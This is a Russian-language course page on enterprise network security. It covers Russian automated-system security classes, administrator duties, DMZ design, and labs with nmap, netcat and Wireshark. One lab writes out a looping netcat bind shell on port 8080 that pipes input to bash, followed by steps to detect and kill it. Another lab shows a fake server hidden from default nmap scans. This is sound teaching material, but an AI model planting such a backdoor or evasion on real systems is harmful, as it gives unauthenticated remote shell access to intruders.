<h1>Модуль 1. Периметры безопасности и размещение сервисов в сети предприятия</h1>

<h2>Обзор моделей безопасности и обязанностей администратора безопасности компьютерной сети</h2>

<p><a href="https://clck.ru/RLQU6">Должностная инструкция aдминистраторa информационной безопасности</a></p>

<p><a href="https://clck.ru/RLQVR">Должностная инструкция администратора безопасности компьютерных систем и сетей</a></p>

<p><a href="https://clck.ru/DXeeB">Руководящий документАвтоматизированные системы. Защита от несанкционированного доступа к информации Классификация автоматизированных систем и требования по защите информации</a></p>

<p><strong>Важный факт!</strong>
<em>Вопросы информационной безопасности можно рассматривать только 
при наличии четко определенных конфликтующих сторон.</em></p>

<p>Сокращения:</p>

<blockquote>
  <p>АС - автоматизированные системы
НСД - несанкционированный доступ
СЗИ - система защиты информации
СЗИ НСД - система защиты информации от несанкционированного доступа</p>
</blockquote>

<ol>
<li>Классификация распространяется на все действующие и проектируемые АС учреждений, организаций и предприятий, обрабатывающие конфиденциальную информацию.</li>
<li>Деление АС на соответствующие классы по условиям их функционирования с точки зрения защиты информации необходимо в целях разработки и применения обоснованных мер по достижению требуемого уровня защиты информации.</li>
<li>Дифференциация подхода к выбору методов и средств защиты определяется важностью обрабатываемой информации, различием АС по своему составу, структуре, способам обработки информации, количественному и качественному составу пользователей и обслуживающего персонала.</li>
<li><p>Необходимыми исходными данными для проведения классификации конкретной АС являются:</p>

<ul>
<li>перечень защищаемых информационных ресурсов АС и их уровень конфиденциальности;</li>
<li>перечень лиц, имеющих доступ к штатным средствам АС, с указанием их уровня полномочий;</li>
<li>матрица доступа или полномочий субъектов доступа по отношению к защищаемым информационным ресурсам АС;</li>
<li>режим обработки данных в АС.</li>
</ul></li>
<li><p>К числу определяющих признаков, по которым производится группировка АC в различные классы, относятся:</p>

<ul>
<li>наличие в АС информации различного уровня конфиденциальности;</li>
<li>уровень полномочий субъектов доступа АС на доступ к конфиденциальной информации;</li>
<li>режим обработки данных в АС - коллективный или индивидуальный.</li>
</ul></li>
<li><p>Устанавливается три группы и девять классов защищенности АС от НСД к информации.</p>

<ul>
<li>Третья группа включает АС, в которых работает один пользователь. Группа содержит два класса - 3Б и 3А.</li>
<li>Вторая группа включает АС, в которых работает много пользователей с одинаковыми правами. Группа содержит два класса - 2Б и 2А.</li>
<li>Первая группа включает многопользовательские АС. Группа содержит пять классов - 1Д, 1Г, 1В, 1Б и 1А.</li>
</ul></li>
</ol>

<p><em>Примеры</em></p>

<h3>Калькулятор Windows.</h3>

<p><img src="Калькулятор.png" alt="Калькулятор" title="" /></p>

<p>С т.з. данной программы все пользователи - один. Т.е. категория - 3.</p>

<h3>Windows 9x</h3>

<p><img src="Винда.png" alt="Винда" title="" /></p>

<p>В системе присутствует "Окно входа в систему"...</p>

<p><img src="Виндалогин.png" alt="Виндалогин" title="" /></p>

<p>... т.е. пользователи различаются. Но из-за ограничений файловой системы FAT(VFAT) 
их права не разграничены. Т.е. категория 2.</p>

<h3>Ubuntu Linux</h3>

<p><img src="Ubunluls.png" alt="Ubunluls" title="" /></p>

<p>Как мы знаем, в большинстве современных ОС имеется разделение прав доступа к объектам. Т.е. Ubuntu (например) - категория 1.</p>

<h3>Вопросы:</h3>

<p>1) Правомочно ли рассматривать Калькулятор Windows как АС?</p>

<p>2) Приведите примеры АС II категории?</p>

<p>3) Определите категорию АС: сайт статической верстки, обновление выполняется по FTP.</p>

<h3>Основные требования к АС</h3>

<p>Идентификация, проверка подлинности и контроль доступа субъектов</p>

<p>Регистрация и учет: входа (выхода) субъектов доступа в (из) систему(ы) (узел сети)</p>

<p>Регистрация и учет: выдачи печатных (графических) выходных документов</p>

<p>Регистрация и учет: запуска (завершения) программ и процессов (заданий, задач)</p>

<p>Регистрация и учет: доступа  программ  субъектов  доступа  к  файлам, </p>

<p>Регистрация и учет: доступа к терминалам, ЭВМ, узлам сети ЭВМ, каналам связи, внешним устройствам ЭВМ, программам, томам, каталогам, файлам, записям, полям записей.</p>

<p>Регистрация и учет: изменения полномочий субъектов доступа.</p>

<ul>
<li>дата и время входа (выхода) субъекта доступа в систему (из системы) или загрузки (останова) системы.</li>
<li>результат   попытки   входа:   успешная   или   неуспешная </li>
<li>несанкционированная;</li>
<li>идентификатор (код или фамилия) субъекта, предъявленный при попытке доступа;</li>
<li>должен  проводиться  учет  всех  защищаемых  носителей  информации  с помощью их маркировки и с занесением учетных данных журнала (учетную карточку);</li>
<li>учет защищаемых носителей должен проводиться в журнале с регистрацией их выдачи.</li>
</ul>

<p>Обеспечение целостности программных средств и обрабатываемой информации</p>

<ul>
<li>целостность СЗИ НСД проверяется при загрузке системы по контрольным суммам компонент СЗИ;</li>
<li>целостность  программной  среды  обеспечивается  использованием трансляторов с языков высокого уровня и отсутствием средств модификации объектного  кода  программ  в  процессе  обработки  и  хранения защищаемой информации;</li>
<li>должно проводиться периодическое тестирование функций СЗИ НСД при изменении программной среды и персонала АС с помощью тест-программ, имитирующих попытки НСД;</li>
<li>должны  быть  в  наличии  средства  восстановления  СЗИ  НСД, предусматривающие ведение двух копий программных средств СЗИ НСД и их периодическое обновление и контроль работоспособности.</li>
</ul>

<p>Наличие администратора (службы) защиты информации в АС</p>

<p>Периодическое тестирование СЗИ НСД</p>

<p>Наличие средств восстановления СЗИ НСД</p>

<h3>Задачи и функции Администратора информационной безопасности</h3>

<ul>
<li>Kонтроль эффективности защиты информации;</li>
<li>Cопровождение СЗИ от  НСД и основных технических средств и систем;</li>
<li>Kонтроль разграничения доступа.</li>
<li>Kонтроль соответствия действий пользователей АС требованиям.</li>
<li>Участие на стадии проектирования (внедрения) АС в разработке технологии обработки информации ограниченного доступа (далее – информации) по вопросам:
<ul>
<li>организации порядка учета, хранения и обращения с документами и носителями информации;</li>
<li>определения степени секретности отдельных документов, носителей и массивов информации;</li>
<li>подготовки инструкций, определяющих задачи, функции, ответственность, права и обязанности  администраторов и пользователей АС по вопросам защиты информации, а также ответственных по защите информации в процессе автоматизированной обработки информации.</li>
</ul></li>
<li>Сопровождение СЗИ от НСД к ней, в том числе средств криптографической защиты информации.</li>
<li>Контроль соответствия общесистемной программной среды стандарту (контроль целостности программного обеспечения) и проверка включаемых в АС новых программных средств.</li>
<li>Методическое руководство работой администраторов и пользователей АС в вопросах обеспечения информационной безопасности.</li>
<li>Ведение переченя установленных в подразделениях ОТСС, СЗИ от НСД и перечень задач, решаемых с их использованием.</li>
<li>Непосредственное управление режимами работы и административную поддержку функционирования \ применяемых на рабочих станциях специальных программных и программно-аппаратных СЗИ от НСД.</li>
<li>Периодически проверять состояние используемых СЗИ от НСД, осуществлять проверку правильности их настройки (выборочное тестирование).</li>
<li>Вести журнал учета нештатных ситуаций, фактов вскрытия и опечатывания, защищенных СВТ, выполнения профилактических работ, установки и модификации аппаратных и программных СЗИ.</li>
<li>Проводить работу по выявлению возможности вмешательства в процесс функционирования АС и осуществления НСД к информации и техническим средствам РС.</li>
<li>Докладывать руководству о выявленных угрозах безопасности информации, обрабатываемой в АС, об имевших место попытках НСД к информации и техническим средствам РС.</li>
</ul>

<h2>Разделение сервисов сети предприятия</h2>

<h3>Вариант 1. Плоская сеть</h3>

<p><img src="плоскаясеть.jpg" alt="плоская сеть" title="" /></p>

<p>В данном варианте все узлы корпоративной сети содержатся в одной, общей для всех сети («Внутренняя сеть»), в рамках которой коммуникации между ними не ограничиваются. Сеть подключена к Интернет через пограничный маршрутизатор/межсетевой экран.</p>

<p>Плюсы варианта:</p>

<ul>
<li><p>Минимальные требования к функционалу IFW (можно сделать практически на любом, даже домашнем роутере).</p></li>
<li><p>Минимальные требования к знаниям специалиста, осуществляющего реализацию варианта.</p></li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Минимальный уровень безопасности. В случае взлома, при котором Нарушитель получит контроль над одним из опубликованных в Интернете серверов, ему для дальнейшей атаки становятся доступны все остальные узлы и каналы связи корпоративной сети.</li>
</ul>

<h3>Вариант 2. DMZ</h3>

<p><img src="дмз.jpg" alt="dmz" title="" /></p>

<p>Для устранения этого недостатка узлы сети, доступные из Интернет, помещают в специально выделенный сегмент – демилитаризованную зону (DMZ). DMZ организуется с помощью межсетевых экранов, отделяющих ее от Интернет 
(IFW) и от внутренней сети (DFW).</p>

<p>При этом правила фильтрации межсетевых экранов выглядят следующим образом:</p>

<ul>
<li>Из внутренней сети можно инициировать соединения в DMZ и в WAN (Wide Area Network).</li>
<li>Из DMZ можно инициировать соединения в WAN.</li>
<li>Из WAN можно инициировать соединения в DMZ.</li>
<li>Инициация соединений из WAN и DMZ ко внутренней сети запрещена.</li>
</ul>

<p>Плюсы варианта:</p>

<ul>
<li>Повышенная защищённость сети от взломов отдельных сервисов. Даже если один из серверов будет взломан, Нарушитель не сможет получить доступ к ресурсам, находящимся во внутренней сети (например, сетевым принтерам, системам видеонаблюдения и т.д.).</li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Сам по себе вынос серверов в DMZ не повышает их защищенность.</li>
<li>Необходим дополнительный МЭ для отделения DMZ от внутренней сети.</li>
</ul>

<h3>Вариант 3. Разделение сервисов на Front-End и Back-End</h3>

<p><img src="фэбэ.jpg" alt="Front-End и Back-End" title="" /></p>

<p>Одним из вариантов исправления ситуации является разделение функционала сервиса на две части: Front-End и Back-End. При этом каждая часть располагается на отдельном сервере, между которыми организуется сетевое взаимодействие. Сервера Front-End, реализующие функционал взаимодействия с клиентами, находящимися в Интернет, размещают в DMZ, а сервера Back-End, реализующие остальной функционал, оставляют во внутренней сети. Для взаимодействия между ними на DFW создают правила, разрешающие инициацию подключений от Front-End к Back-End.</p>

<p>Плюсы варианта:</p>

<ul>
<li>В общем случае атаки, направленные против защищаемого сервиса, могут «споткнуться» об Front-End, что позволит нейтрализовать или существенно снизить возможный ущерб. Например, атаки типа TCP SYN Flood или slow http read, направленные на сервис, приведут к тому, что Front-End сервер может оказаться недоступен, в то время как Back-End будет продолжать нормально функционировать и обслуживать пользователей.</li>
<li>В общем случае на Back-End сервере может не быть доступа в Интернет, что в случае его взлома (например, локально запущенным вредоносным кодом ) затруднит удаленное управление им из Интернет.</li>
<li>Front-End хорошо подходит для размещения на нем межсетевого экрана уровня приложений (например, Web application firewall) или системы предотвращения вторжений (IPS, например snort).</li>
</ul>

<p>Минусы варианта:</p>

<ul>
<li>Для связи между Front-End и Back-End на DFW создается правило, разрешающее инициацию соединения из DMZ во внутреннюю сеть, что порождает угрозы, связанные с использованием данного правила со стороны других узлов в DMZ (например, за счет реализации атак IP spoofing, ARP poisoning и т. д.)</li>
<li>Не все сервисы могут быть разделены на Front-End и Back-End.</li>
<li>В компании должны быть реализованы бизнес-процессы актуализации правил межсетевого экранирования.</li>
<li>В компании должны быть реализованы механизмы защиты от атак со стороны Нарушителей, получивших доступ к серверу в DMZ.</li>
</ul>

<h1>Лабораторные работы: Развертывание шлюза и сетей предприятия</h1>

<h2>Работа с nmap</h2>

<pre><code>student@PC / $ nmap localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000084s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
631/tcp  open  ipp
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
student@PC / $ nmap -A localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2020-10-12 18:03 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000081s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 34:ca:ed:e8:f9:61:1d:4a:6f:35:20:04:1e:2c:6c:a1 (RSA)
|_  256 12:15:e1:57:9a:92:98:0c:9f:bd:9b:0a:b1:29:bc:8e (ECDSA)
25/tcp   open  smtp     Exim smtpd 4.89
| smtp-commands: PC Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
631/tcp  open  ipp      CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.1
8081/tcp open  backdoor No-auth shell (**BACKDOOR**)
Service Info: Host: PC; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
</code></pre>

<h2>Cозздание бэкдора</h2>

<pre><code>student@PC / $ cd /tmp
student@PC /tmp/ $ mkfifo fifo_file
student@PC /tmp/ $ cat fifo_file | nc -l -p 8080 | bash &gt; fifo_file

while true
do
    cat fifo_file | nc -l -p 8080 | bash &gt; fifo_file    
done
</code></pre>

<h2>Устранение бэкдора</h2>

<pre><code>student@PC / $ netstat -apn | grep 8080
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      29656/nc            
student@PC / $ ps fax | grep 29656
29779 pts/2    S+     0:00  |   |   \_ grep --color=auto 29656
29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
student@PC / $ ps fax | grep -B 3 29656
 4943 pts/1    Ss+    0:00  |   \_ bash
12740 pts/2    Ss     0:00  |   \_ bash
29788 pts/2    R+     0:00  |   |   \_ ps fax
29789 pts/2    S+     0:00  |   |   \_ grep --color=auto -B 3 29656
16188 pts/3    Ss+    0:00  |   \_ bash
29186 pts/4    Ss     0:00  |   \_ bash &lt; родитель
29655 pts/4    S+     0:00  |       \_ cat aa
29656 pts/4    S+     0:00  |       \_ nc -l -p 8080
^^^^^ PID бэкдора
student@PC / $ kill 29656 бэкдор перезапустился
student@PC / $ kill 29186 
student@PC / $ kill -9 29186 бэкдор уничтожен
student@PC / $ netstat -apn | grep 8080
                            пусто!
student@PC / $ nmap localhost
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
631/tcp open  ipp
                                                        Порта 8080 нет в списке!
</code></pre>

<h2>Настройка шлюза для подключения сети предприятия к Internet</h2>

<p><a href="https://clck.ru/RLqPk">Обеспечение работоспособности и защиты межсетевого экрана с помощью iptables</a></p>

<p><a href="https://clck.ru/RMGKn">Проброс портов в локальную сеть с помощью iptables</a></p>

<p>1) Изучить литературу по ссылке.</p>

<p>2) Используя виртуальную машину (или хост) сконфигурировать:</p>

<ul>
<li>Файервол плоской сети</li>
<li>Проброс порта 80 на один из внутренних хостов</li>
</ul>

<p>3) Продемонстрировать результат, используя nmap для тестирования.</p>

<p><a href="https://www.youtube.com/watch?v=wJARN099DUw">Работа с git</a></p>

<h1>Модуль 2 Анализ информационных систем предприятия с точки зрения безопасности</h1>

<h2>Обзор сканеров сетей и анализаторов траффика</h2>

<p><a href="https://clck.ru/RMuaG">21 лучший инструмент Kali Linux для взлома и тестирования на проникновение</a></p>

<h3>Инструмент Nmap</h3>

<p>Nmap — свободная утилита, предназначенная для разнообразного настраиваемого сканирования IP-сетей с любым количеством объектов, определения состояния объектов сканируемой сети (портов и соответствующих им служб). Изначально программа была реализована для систем UNIX, но сейчас доступны версии для множества операционных систем.</p>

<p>Nmap использует множество различных методов сканирования, таких как UDP, TCP (connect), TCP SYN (полуоткрытое), FTP-proxy (прорыв через ftp), Reverse-ident, ICMP (ping), FIN, ACK, Xmas tree, SYN- и NULL-сканирование. Nmap также поддерживает большой набор дополнительных возможностей, а именно: определение операционной системы удалённого хоста с использованием отпечатков стека TCP/IP, «невидимое» сканирование, динамическое вычисление времени задержки и повтор передачи пакетов, параллельное сканирование, определение неактивных хостов методом параллельного ping-опроса, сканирование с использованием ложных хостов, определение наличия пакетных фильтров, прямое (без использования portmapper) RPC-сканирование, сканирование с использованием IP-фрагментации, поиск уязвимостей SQL Injection, а также произвольное указание IP-адресов и номеров портов сканируемых сетей.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Nmap-4.53.png/800px-Nmap-4.53.png" alt="Nmap-4.53.png" title="" /></p>

<h3>Инструмент Wireshark</h3>

<p>Wireshark — программа-анализатор трафика для компьютерных сетей Ethernet и некоторых других. Имеет графический пользовательский интерфейс. Изначально проект назывался Ethereal, но, из-за проблем с торговой маркой, в июне 2006 года проект был переименован в Wireshark.</p>

<p>Функциональность, которую предоставляет Wireshark, очень схожа с возможностями программы tcpdump, однако Wireshark имеет графический пользовательский интерфейс и гораздо больше возможностей по сортировке и фильтрации информации. Программа позволяет пользователю просматривать весь проходящий по сети трафик в режиме реального времени, переводя сетевую карту в неразборчивый режим (англ. promiscuous mode).</p>

<p>Программа распространяется под свободной лицензией GNU GPL и использует для формирования графического интерфейса кроссплатформенную библиотеку GTK+ (планируется переход на Qt). Существуют версии для большинства UNIX-подобных систем, в том числе GNU/Linux, Solaris, FreeBSD, NetBSD, OpenBSD, Mac OS X, а также для Windows.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/Wireshark_3.0.3_screenshot.png/800px-Wireshark_3.0.3_screenshot.png" alt="Wireshark" title="" /></p>

<h3>Инструмент Nessus</h3>

<p>Nessus — программа для автоматического поиска известных изъянов в защите информационных систем. Она способна обнаружить наиболее часто встречающиеся виды уязвимостей, например:
Программа имеет клиент-серверную архитектуру, что сильно расширяет возможности сканирования.
Согласно проведенному порталом securitylab.ru опросу, nessus используют 17 % респондентов 
Прежде всего используется для сканирования портов и определяет сервисы, использующие их. Также проводится проверка сервисов по базе уязвимостей. Для тестирования уязвимостей используются специальные плагины, написанные на языке NASL(Nessus Attack Scripting Language).</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Nessus_ng_report.png" alt="Nessus-Professional-FullColor-RGB.svg" title="" /></p>

<h3>Инструмент John the Ripper</h3>

<p>John The Ripper (досл. Джон-потрошитель) — свободная программа, предназначенная для восстановления паролей по их хешам. Основное назначение программы — аудит слабых паролей в UNIX системах путём перебора возможных вариантов. ПО JtR способно создавать словари любой сложности, а также извлекать хеш из файла, что является одной из самых сильных сторон JtR по сравнению с аналогичными программами. Программа также может выполнять аудит NTLM хешей, Kerberos, и др. Существуют реализации под различные ОС. Весьма популярна из-за поддержки большого количества хешей, автораспознавания хеша и настраиваемого взломщика. Также поддерживает множество модулей, включая сторонние, предоставляющих поддержку MD4 хешей, LDAP и MySQL паролей и т.д. Кроме хешей паролей доступен перебор паролей к архивам, атаки на методы аутентификации (WPA, HMAC,...). Существует кросс-платформенный графический интерфейс Johny - GUI, который требуется устанавливать отдельно. На 2012 год поддерживалось более 30 форматов в jumbo версии. По состоянию на июль 2018 года JtR bleeding-jumbo версия поддерживает 262 формата.
На компьютерном сленге среди разработчиков JtR упоминается, как кровотечение.[источник не указан 424 дня]
Ниже представлен пример вывода программы во время работы в операционной системе Linux.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ef/Image-wertfghjnmbvc.jpg/800px-Image-wertfghjnmbvc.jpg" alt="Image-wertfghjnmbvc.jpg" title="" /></p>

<h3>Инструмент Snort</h3>

<p>Snort — свободная сетевая система предотвращения вторжений (IPS) и обнаружения вторжений (IDS) с открытым исходным кодом, способная выполнять регистрацию пакетов и в реальном времени осуществлять анализ трафика в IP-сетях.
Создана Мартином Рёшем (англ. Martin Roesch), в дальнейшем развивалась и поддерживалась основанной им компанией Sourcefire (поглощена Cisco в 2013 году).
Выполняет протоколирование, анализ, поиск по содержимому, а также широко используется для активного блокирования или пассивного обнаружения целого ряда нападений и зондирований, таких как попытки атак на переполнение буфера, скрытое сканирование портов, атаки на веб-приложения, SMB-зондирование и попытки определения операционной системы. Программное обеспечение в основном используется для предотвращения проникновения, блокирования атак, если они имеют место.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Snort_ids_console.gif/800px-Snort_ids_console.gif" alt="Snort ids console.gif" title="" /></p>

<h3>Инструмент Nikto</h3>

<p>Nikto — веб-сканер, проверяющий веб-серверы на самые частые ошибки, возникающие обычно из-за человеческого фактора. Проверяет целевой веб-сервер на наличие опасных файлов и исполняемых сценариев, инструментов администрирования базами данных, устаревшего программного обеспечения.
Nikto — это  open-source веб-сканер, однако некоторые файлы, которые он использует для работы, таковыми не являются.
Nikto выиграл "Best IT Security Tools for 2009" от Security-Database в номинации программ с открытым исходным кодом для сканирования приложений.</p>

<h2>Лабораторные работы</h2>

<h3>Определение списка хостов с использованием nmap</h3>

<pre><code>$ nmap 192.168.43.*
</code></pre>

<p>Результат:</p>

<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:23 +05
Nmap scan report for gateway (192.168.43.1)
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for microlab (192.168.43.25)
Host is up (0.000044s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for macrolab (192.168.43.77)
Host is up (0.025s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
23/tcp open  telnet

Nmap scan report for extralab (192.168.43.180)
Host is up (0.012s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
631/tcp open  ipp

Nmap done: 256 IP addresses (4 hosts up) scanned in 6.08 seconds
</code></pre>

<h3>Определение типа сервиса на указанном хосте/порту</h3>

<p>Используется типовой порт:</p>

<pre><code>$ nmap -A -p 631 192.168.43.180
</code></pre>

<p>Результат:</p>

<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:28 +05
Nmap scan report for extralab (192.168.43.180)
Host is up (0.0026s latency).
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Home - CUPS 2.2.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
</code></pre>

<p>Обнаружен CUPS версии 2.2.1.</p>

<p><img src="cups.png" alt="cups" title="" /></p>

<p>Используется "левый" порт и фальшивый сервер:</p>

<p><img src="fakehttp.png" alt="fakehttp" title="" /></p>

<pre><code>echo "HTTP/1.1 200 OK"
echo "Date: Wed, 11 Feb 2009 11:20:59 GMT"
echo "Server: Apache"
echo "X-Powered-By: PHP/5.2.4-2ubuntu5wm1"
echo "Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT"
echo "Content-Language: ru"
echo "Content-Type: text/html; charset=utf-8"
echo "Connection: close"
echo ""
echo "&lt;pre&gt;"
date
echo "&lt;/pre&gt;"
</code></pre>

<p>Peзультат:</p>

<pre><code>$ nmap -A -p 8080 localhost
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 12:46 +05
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy Apache
| fingerprint-strings: 
|   NULL: 
|     HTTP/1.1 200 OK
|     Date: Wed, 11 Feb 2009 11:20:59 GMT
|     Server: Apache
|     X-Powered-By: PHP/5.2.4-2ubuntu5wm1
|     Last-Modified: Wed, 11 Feb 2009 11:20:59 GMT
|     Content-Language: ru
|     Content-Type: text/html; charset=utf-8
|     Connection: close
|     &lt;pre&gt;
|     2020 12:46:01 +05
|_    &lt;/pre&gt;
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=10/13%Time=5F855B39%P=x86_64-pc-linux-gnu%r(N
SF:ULL,111,"HTTP/1\.1\x20200\x20OK\nDate:\x20Wed,\x2011\x20Feb\x202009\x20
SF:11:20:59\x20GMT\nServer:\x20Apache\nX-Powered-By:\x20PHP/5\.2\.4-2ubunt
SF:u5wm1\nLast-Modified:\x20Wed,\x2011\x20Feb\x202009\x2011:20:59\x20GMT\n
SF:Content-Language:\x20ru\nContent-Type:\x20text/html;\x20charset=utf-8\n
SF:Connection:\x20close\n\n&lt;pre&gt;\n\xd0\x92\xd1\x82\x2013\x20\xd0\xbe\xd0\x
SF:ba\xd1\x82\x202020\x2012:46:01\x20\+05\n&lt;/pre&gt;\n");
</code></pre>

<p>Peзультат на порту 18765:</p>

<pre><code>$ nmap -A localhost
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
631/tcp open  ipp     CUPS 2.3
...
</code></pre>

<p>Фальшивый сервер <em>не обнаружен!</em></p>

<pre><code>$ while true; do cat a | nc -l -p 18765 | ./http.sh &gt; a; done
GET / HTTP/1.0

$ while true; do cat a | nc -l -p 8080 | ./http.sh &gt; a; done
GET / HTTP/1.0

OPTIONS / HTTP/1.0

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

PROPFIND / HTTP/1.1
Depth: 1
Content-Length: 0
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET / HTTP/1.1
Host: localhost:8080
Connection: close
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
</code></pre>

<p>Сервер возвращает случайные коды:</p>

<pre><code>$ while true; do cat a | nc -l -p 8080 | ./http.sh &gt; a; done
GET / HTTP/1.0

ieU��random1random2random3random4
                                 /
GET / HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

GET /favicon.ico HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

�f��Q�%�/N�+����l[��f#B�i�

                          H� �Vd�
                                 �b%�]eWP]�25&gt;�F�w�%شJueJ�395/�,�0��̨̩̪���������]�a�W�S�+�/������������`�V�R�$�(kj�s�w�
�8���   �2��ED������Q������P=�&lt;���A�
                                        localhost



*(
GET / HTTP/1.1
Connection: close
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
</code></pre>

<p>Результат:</p>

<pre><code>$ nmap -A localhost -p 8080
PORT     STATE SERVICE     VERSION
8080/tcp open  http-proxy?
</code></pre>

<p>Сервер не распознан. Что не мешает злоумышленнику работать с ним. </p>

<p>Вывод. От nmap можно спрятать сервер, если разместить его вне диапазона портов, 
сканируемых по-умолчанию и нарушить алгоритм его работы. 
На действия злоумышленника это никак не повлияет.</p>

<h3>Расшифровка http-траффика с Wireshark</h3>

<p><img src="wireshark.png" alt="Wireshark" title="" /></p>

<p>Провели сканирование фэйкового http-сервера и получили следующий траффик:</p>

<p><img src="decode_0.png" alt="Wireshark" title="" /></p>
